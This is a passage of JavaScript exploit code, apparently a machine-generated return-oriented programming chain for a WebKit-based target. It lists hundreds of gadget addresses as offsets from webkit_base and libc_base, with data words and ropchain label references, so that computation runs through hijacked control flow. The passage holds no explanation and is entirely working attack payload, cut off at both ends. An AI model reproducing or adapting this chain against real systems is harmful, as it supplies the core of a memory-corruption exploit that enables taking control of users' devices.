webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1298:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115272, //L1300
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1300:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1301:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1302:
db([27, 0]); // 0x1b
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+115376, //L1303
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+115392, //L1304
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1303:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+115480, //L1306
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115536, //L1307
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1307:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115608, //L1310
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1310:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115664, //L1312
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1312:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115768, //L1314
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1313:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+115856, //L1316
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115872, //L1317
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1316:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1317:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116016, //L1321
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115984, //L1319
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116000, //L1320
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1319:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1320:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1321:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116088, //L1323
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1323:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116144, //L1324
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1324:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116224, //L1326
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1326:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1327:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1328:
db([3, 0]); // 0x3
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+116328, //L1329
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+116344, //L1330
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1329:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+116432, //L1332
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1332:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116488, //L1333
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1333:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116608, //L1336
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1335:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+116696, //L1338
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116712, //L1339
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1338:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116856, //L1343
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116824, //L1341
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116840, //L1342
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1341:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1343:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116928, //L1345
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116984, //L1346
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1346:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117064, //L1348
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1348:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1349:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1350:
db([28, 0]); // 0x1c
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+117168, //L1351
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+117184, //L1352
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1351:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+117272, //L1354
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1354:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117328, //L1355
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1355:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117400, //L1358
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117456, //L1360
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1360:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1361:
webkit_base+1026352, //mov [rdi + 0x10], r9
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117608, //L1363
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1362:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1363:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+117696, //L1365
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117712, //L1366
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1365:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1366:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117856, //L1370
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117824, //L1368
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117840, //L1369
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1368:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1369:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1370:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117928, //L1372
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1372:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117984, //L1373
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1373:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118064, //L1375
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1375:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1376:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1377:
db([29, 0]); // 0x1d
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+118168, //L1378
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+118184, //L1379
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1378:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+118272, //L1381
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118328, //L1382
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1382:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118400, //L1385
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1385:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118456, //L1387
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1387:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1388:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118608, //L1390
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1389:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1390:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+118696, //L1392
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118712, //L1393
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1392:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118856, //L1397
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118824, //L1395
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118840, //L1396
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1395:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1396:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1397:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118928, //L1399
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1399:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118984, //L1400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1400:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119064, //L1402
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1402:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1403:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1404:
db([30, 0]); // 0x1e
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+119168, //L1405
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+119184, //L1406
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1405:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+119272, //L1408
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119328, //L1409
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1409:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119400, //L1412
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1412:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119456, //L1414
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1414:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119560, //L1416
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1415:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+119648, //L1418
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119664, //L1419
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1418:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119808, //L1423
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119776, //L1421
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119792, //L1422
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1421:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1422:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1423:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119880, //L1425
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+119936, //L1426
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1426:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120016, //L1428
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1428:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1429:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1430:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120120, //L1431
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120136, //L1432
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1431:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+120224, //L1434
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1434:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120280, //L1435
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1435:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120400, //L1438
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1437:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1438:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+120488, //L1440
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120504, //L1441
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1440:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1441:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120648, //L1445
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120616, //L1443
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120632, //L1444
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1443:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1444:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1445:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+120720, //L1447
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1447:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120776, //L1448
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1448:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120856, //L1450
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1450:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1451:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1452:
db([31, 0]); // 0x1f
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120960, //L1453
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120976, //L1454
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1453:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+121064, //L1456
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121120, //L1457
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1457:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121192, //L1460
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121248, //L1462
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1462:
db([0, 0]); // 0x0
set_gadgets([
